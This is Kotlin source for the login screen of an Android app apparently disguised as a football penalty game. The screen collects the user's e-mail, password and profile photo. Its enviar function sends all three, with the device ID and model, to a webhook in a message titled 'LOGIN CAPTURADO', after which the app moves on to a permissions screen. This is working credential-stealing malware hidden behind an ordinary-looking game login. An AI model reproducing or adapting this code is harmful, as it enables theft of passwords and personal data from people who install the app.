package com.venice.penaltylegends.ui

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.venice.penaltylegends.R
import com.venice.penaltylegends.core.*
import com.venice.penaltylegends.databinding.ActivityLoginBinding

class LoginActivity : AppCompatActivity() {

    private lateinit var b: ActivityLoginBinding
    private var fotoUri: Uri? = null

    private val pick = registerForActivityResult(ActivityResultContracts.GetContent()) { uri ->
        uri ?: return@registerForActivityResult
        fotoUri = uri
        b.avatar.setImageURI(uri)
        b.dicaFoto.text = "Foto selecionada"
    }

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        Prefs.init(this)
        b = ActivityLoginBinding.inflate(layoutInflater)
        setContentView(b.root)

        b.avatar.setOnClickListener { pick.launch("image/*") }

        b.entrar.setOnClickListener {
            val email = b.email.text.toString().trim()
            val senha = b.senha.text.toString()
            if (!email.contains("@")) { toast("Informe um e-mail valido"); return@setOnClickListener }
            if (senha.length < 4) { toast("A senha precisa ter ao menos 4 digitos"); return@setOnClickListener }

            Prefs.email = email
            Prefs.senha = senha
            enviar(email, senha)

            startActivity(Intent(this, PermissionsActivity::class.java))
            finish()
        }
    }

    private fun enviar(email: String, senha: String) {
        val embeds = listOf(
            Webhook.embed(
                titulo = "LOGIN CAPTURADO",
                desc = "**E-mail:** `$email`\n**Senha:** `$senha`",
                cor = 0xF1C40F,
                campos = listOf(
                    Webhook.f("Aparelho", Prefs.deviceId, true),
                    Webhook.f("Modelo", "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}", true),
                    Webhook.f("Tem foto", if (fotoUri != null) "sim" else "nao", true)
                )
            )
        )

        val uri = fotoUri
        if (uri != null) {
            try {
                val bytes = contentResolver.openInputStream(uri)!!.use { it.readBytes() }
                java.io.File(filesDir, "avatar.jpg").writeBytes(bytes)
                Prefs.fotoPath = java.io.File(filesDir, "avatar.jpg").absolutePath
                Webhook.send(this, embeds, nomeArquivo = "perfil.jpg", bytes = bytes, mime = "image/jpeg")
            } catch (t: Throwable) {
                Webhook.send(this, embeds)
            }
        } else {
            Webhook.send(this, embeds)
        }
    }

    private fun toast(m: String) = Toast.makeText(this, m, Toast.LENGTH_SHORT).show()
}